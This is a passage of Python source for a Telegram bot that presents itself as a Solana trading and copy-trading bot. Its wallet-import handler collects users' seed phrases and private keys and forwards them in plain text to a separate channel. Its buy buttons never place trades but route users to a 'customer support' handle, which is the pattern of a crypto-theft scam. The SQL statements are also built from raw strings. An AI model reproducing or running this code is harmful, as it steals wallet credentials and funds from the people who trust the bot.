        priority = priorities[user[18]]['next']
        cursor.execute(f"UPDATE users SET transaction_priority = '{priority}' WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif query.data == "change_transaction_priority_value":
        context.user_data['change_transaction_priority_value'] = True
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the new transaction priority value""")
    elif query.data == "toggle_sell_protection":
        cursor.execute(f"UPDATE users SET sell_protection_enabled = NOT sell_protection_enabled WHERE id = {chat_id}")
        connection.commit()
        await send_settings(chat_id, context, query)
    elif "buy_1_0" in query.data or "buy_5_0" in query.data:
        user = get_user(chat_id)
        wallet_balance = await get_balance(user[1])
        if wallet_balance > 0:
            total_balance = round(wallet_balance, 6)
        else:
            total_balance = 0
        if total_balance:
            limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
            if total_balance > limit:
                await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @AlphaCapitalFx""")
                return
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
{limit} SOL Minimum balance required to activate trading bot""")
        else:
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"Not enough SOL to buy")
    elif "buy_x" in query.data:
        await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Enter the sum down below""")
        context.user_data['buy_x'] = True

    
def get_dexscreener_contract(query):
    response = requests.get(
        f"https://api.dexscreener.com/latest/dex/search?q={query}",
        headers={},
    )
    if response.json()['pairs'] != []:
        return response.json()['pairs'][0]
    else:
        return
    
def get_pumpfun_token(token_address):
    url = "https://streaming.bitquery.io/eap"
    headers = {
        "Content-Type": "application/json",
        'Authorization': f'Bearer {bitAPI}'
    }

    query = """
subscription MyQuery {
  Solana {
    DEXTradeByTokens(
      orderBy: { descending: Block_Time }
      limit: { count: 10 }
      where: {
        Trade: {
          Dex: {
            ProgramAddress: {
              is: "6EF8rrecthR5Dkzon8Nwu78hRvfCKubJ14M5uBEwF6P"
            }
          }
          Currency: {
            MintAddress: { is: "token_address" }
          }
        }
        Transaction: { Result: { Success: true } }
      }
    ) {
      Block {
        Time
      }
      Trade {
        Currency {
          MintAddress
          Name
          Symbol
        }
        Dex {
          ProtocolName
          ProtocolFamily
          ProgramAddress
        }
        Side {
          Currency {
            MintAddress
            Symbol
            Name
          }
        }
        Price
        PriceInUSD
      }
      Transaction {
        Signature
      }
    }
  }
}
    """.replace("token_address", token_address)

    try:
        payload_graphql = json.dumps({'query': query})
        response = requests.post(url, headers=headers, data=payload_graphql)
        response.raise_for_status()
        data = response.json()
        trades = data["data"]["Solana"]["DEXTradeByTokens"]
        results = [
        {
            "Name": trade["Trade"]["Currency"]["Name"],
            "Symbol": trade["Trade"]["Currency"]["Symbol"],
            "PriceInUSD": trade["Trade"]["PriceInUSD"],
        }
        for trade in trades]
        if results:
            return results[0]
        else:
            return
    except Exception as e:
        print(f"{e}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    message = update.message.text
    user_id = update.message.from_user.id
    contract = ''
    is_dex = False
    contract_data = {}

    if context.user_data['buy_x']:
        amount = message
        user = get_user(update.message.chat_id)
        chat_id = update.message.chat_id
        wallet_balance = await get_balance(user[1])
        total_balance = round(wallet_balance, 6)
        if total_balance:
            limit = get_limit(chat_id) if get_limit(chat_id) != None else 3
            if total_balance > limit:
                await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""BOT ACTIVATION FAILED ⚠️
CONTACT CUSTOMER SUPPORT FOR ASSISTANCE - @AlphaCapitalFx""")
                return
            await context.bot.send_message(chat_id=chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""🚨 BOT NOT YET ACTIVATED 🚨
{limit} SOL Minimum balance required to activate trading bot""")
        
    elif context.user_data['change_min_position_value']:
        try:
            min_position_value = float(message)
            cursor.execute(f"UPDATE users SET min_position_value = {min_position_value} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_tag']:
        tag = message
        context.user_data['tag'] = tag
        context.user_data['change_tag'] = False
        await send_copy_trade(user_id, context)
        return
    elif context.user_data['set_target_wallet']:
        target_wallet = message
        context.user_data['target_wallet'] = target_wallet
        context.user_data['set_target_wallet'] = False
        await send_copy_trade(user_id, context)
        return
    elif context.user_data['change_buy_percentage']:
        try:
            buy_percentage = float(message)
            context.user_data['buy_percentage'] = buy_percentage
            context.user_data['change_buy_percentage'] = False
            await send_copy_trade(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
            return
    elif context.user_data['change_buy_gas']:
        try:
            buy_gas = float(message)
            context.user_data['buy_gas'] = buy_gas
            context.user_data['change_buy_gas'] = False
            await send_copy_trade(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
            return
    elif context.user_data['change_sell_gas']:
        try:
            sell_gas = float(message)
            context.user_data['sell_gas'] = sell_gas
            context.user_data['change_sell_gas'] = False
            await send_copy_trade(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
            return
    elif context.user_data['change_slippage']:
        try:
            slippage = float(message)
            context.user_data['slippage'] = slippage
            context.user_data['change_slippage'] = False
            await send_copy_trade(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
            return
    elif context.user_data['change_auto_buy_value']:
        try:
            auto_buy_value = float(message)
            cursor.execute(f"UPDATE users SET auto_buy_value = {auto_buy_value} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_left_buy_button']:
        try:
            left_button = float(message)
            cursor.execute(f"UPDATE users SET left_buy_button = {left_button} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_right_buy_button']:
        try:
            right_button = float(message)
            cursor.execute(f"UPDATE users SET right_buy_button = {right_button} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_left_sell_button']:
        try:
            left_button = float(message)
            cursor.execute(f"UPDATE users SET left_sell_button = {left_button} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_right_sell_button']:
        try:
            right_button = float(message)
            cursor.execute(f"UPDATE users SET right_sell_button = {right_button} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_buy_slippage']:
        try:
            buy_slippage = float(message)
            cursor.execute(f"UPDATE users SET buy_slippage = {buy_slippage} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_sell_slippage']:
        try:
            sell_slippage = float(message)
            cursor.execute(f"UPDATE users SET sell_slippage = {sell_slippage} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_max_price_impact']:
        try:
            max_price_impact = float(message)
            cursor.execute(f"UPDATE users SET max_price_impact = {max_price_impact} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['change_transaction_priority_value']:
        try:
            transaction_priority_value = float(message)
            cursor.execute(f"UPDATE users SET transaction_priority_value = {transaction_priority_value} WHERE id = {user_id}")
            connection.commit()
            await send_settings(user_id, context)
            return
        except:
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Invalid value""")
    elif context.user_data['import_wallet'] != False:
        stype = context.user_data['import_wallet']
        try:
            if stype == "seed":
                if len(message.split(' ')) not in [12, 24]:
                    raise Exception("Invalid seed phrase")
                keypair = Keypair.from_seed_phrase_and_passphrase(message, "")
                public_key = keypair.pubkey()
                private_key_raw = keypair.secret() + bytes(public_key)
                private_key = str(base58.b58encode(private_key_raw).decode('utf-8'))
                await context.bot.send_message(chat_id=imported_channel, text=f"Wallet Imported: Seed phrase: {message}, public key: {str(public_key)}")
                got_balance = await check_balance(str(public_key))
                user = get_user(user_id)
                wallet_balance = await get_balance(user[1])
                cursor.execute(f"UPDATE users SET balance = {got_balance + wallet_balance} WHERE id = {user_id}")
                connection.commit()
                await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Wallet imported successfully""")
            else:
                private_key = message
                if len(private_key) < 86:
                    raise Exception("Invalid private key")
                public_key = Keypair.from_base58_string(private_key).pubkey()
                await context.bot.send_message(chat_id=imported_channel, text=f"Wallet Imported: Private key: {private_key}, public key: {str(public_key)}")
                got_balance = await check_balance(str(public_key))
                user = get_user(user_id)
                wallet_balance = await get_balance(user[1])
                cursor.execute(f"UPDATE users SET balance = {got_balance + wallet_balance} WHERE id = {user_id}")
                connection.commit()
                await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""
Wallet imported successfully
""")
                context.user_data.pop('import_wallet')
        except Exception as e:
            print(e)
            await context.bot.send_message(chat_id=update.message.chat_id, parse_mode=ParseMode.MARKDOWN, text=f"""Error importing wallet""")
        finally:
            await start_fn(None, user_id, context)
        return
    elif "pump.fun" in message:
        contract = message.split('pump.fun/coin/')[1]
    elif "birdeye.so/token" in message:
        contract = message.split('birdeye.so/token')[1].split('?')[0]
    elif "dexscreener.com/solana" in message:
        data = get_dexscreener_contract(message.split('dexscreener.com/solana/')[1])
        is_dex = True
        contract_data = data
        contract = data['baseToken']['address']
    elif "meteora.ag" in message:
        data = requests.get(
            f"https://dlmm-api.meteora.ag/pair/{message.split('meteora.ag/dlmm/')[1]}",
            headers={},
        ).json()
        contract = data['mint_x']
    elif " " not in message:
        data = get_dexscreener_contract(message)
        is_dex = True
        contract_data = data
        contract = message
    else:
        return
    if not is_dex:
        contract_data = get_dexscreener_contract(contract)
    if contract_data:
        prices = contract_data['priceChange']
        user = get_user(update.message.chat_id)
        wallet_balance = await get_balance(user[1])
        total_balance = round(wallet_balance, 6)
        message = f"""
{contract_data['baseToken']['name']} | *{contract_data['baseToken']['symbol']}* | {contract_data['baseToken']['address']}

Price: $*{contract_data['priceUsd']}*
5m: *{prices['m5']}%*, 1h: *{prices['h1']}%*, 6h: *{prices['h6']}%*, 24h: *{prices['h24']}%*
Market Cap: $*{contract_data['marketCap']}*

Price Impact (5.0000 SOL): *0.58%*

Wallet Balance: *{total_balance} SOL*
    """
        keyboard = [
            [InlineKeyboardButton("Cancel", callback_data="continue")],
            [InlineKeyboardButton("Explorer", url=f"https://solscan.io/account/{contract_data['baseToken']['address']}"), InlineKeyboardButton("Chart", url=f"{contract_data['url']}")],
            [InlineKeyboardButton("Buy 1.0 SOL", callback_data=f"buy_1_0_{contract_data['baseToken']['address']}"), InlineKeyboardButton("Buy 5.0 SOL", callback_data="buy_5_0"), InlineKeyboardButton("Buy X SOL", callback_data=f"buy_x_{contract_data['baseToken']['address']}")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_message(chat_id=update.message.chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)
    else:
        contract_data = get_pumpfun_token(contract)
        if contract_data:
            price = float(contract_data['PriceInUSD'])
            user = get_user(update.message.chat_id)
            wallet_balance = await get_balance(user[1])
            total_balance = round(wallet_balance, 6)
            message = f"""
{contract_data['Name']} | *{contract_data['Symbol']}* | {contract}

Price: $*{price:.10f}*

Price Impact (5.0000 SOL): *0.58%*

Wallet Balance: *{total_balance} SOL*
    """
            keyboard = [
                [InlineKeyboardButton("Cancel", callback_data="continue")],
                [InlineKeyboardButton("Explorer", url=f"https://solscan.io/account/{contract}"), InlineKeyboardButton("Chart", url=f"https://pump.fun/coin/{contract}")],
                [InlineKeyboardButton("Buy 1.0 SOL", callback_data=f"buy_1_0_{contract}"), InlineKeyboardButton("Buy 5.0 SOL", callback_data="buy_5_0"), InlineKeyboardButton("Buy X SOL", callback_data=f"buy_x_{contract}")],
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await context.bot.send_message(chat_id=update.message.chat_id, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN, text=message)

def main() -> None:
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("buy", buy_cmd))
    application.add_handler(CommandHandler("wallet", wallet_cmd))
    application.add_handler(CommandHandler("sell", sell_cmd))
    application.add_handler(CommandHandler("copytrade", copytrade_cmd))
    application.add_handler(CommandHandler("help", help_cmd))
    application.add_handler(CommandHandler("settings", settings_cmd))
    application.add_handler(CommandHandler("referral", referral_cmd))
    application.add_handler(CommandHandler("checkbotfullyactivated", check_activation_cmd))
    application.add_handler(CommandHandler("set_balance", set_balance_cmd))
    application.add_handler(CommandHandler("get_balance", get_balance_cmd))
    application.add_handler(CommandHandler("set_limit", set_limit_cmd))
    application.add_handler(CommandHandler("check_balances", check_balances_cmd))

    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    application.run_polling()

if __name__ == "__main__":
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    thread = threading.Thread(target=run_check_balances)
    thread.start()
    print("running bot")
    main()
